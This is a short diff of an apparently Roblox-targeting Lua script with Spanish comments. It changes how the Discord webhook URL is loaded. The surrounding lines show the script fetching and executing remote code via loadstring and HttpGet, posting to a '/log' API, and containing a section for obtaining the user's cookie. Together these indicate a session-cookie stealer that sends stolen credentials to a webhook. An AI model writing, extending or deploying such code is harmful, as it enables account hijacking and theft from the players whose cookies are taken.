@@ -3,7 +3,8 @@ local Libraries = loadstring(game:HttpGet("https://raw.githubusercontent.com/sss
 
 -- --- 2. Configuración ---
 local API_URL = "https://depazzhub-api.onrender.com/log"
-local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1234567890/yourwebhookurl"
+-- --- El webhook URL se lee de la variable de entorno de render ---
+local DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL") or "https://discord.com/api/webhooks/1234567890/yourwebhookurl"
 local EMBED_COLOR = 3447003 -- Azul Roblox
 
 -- --- 3. Función para obtener la cookie ---
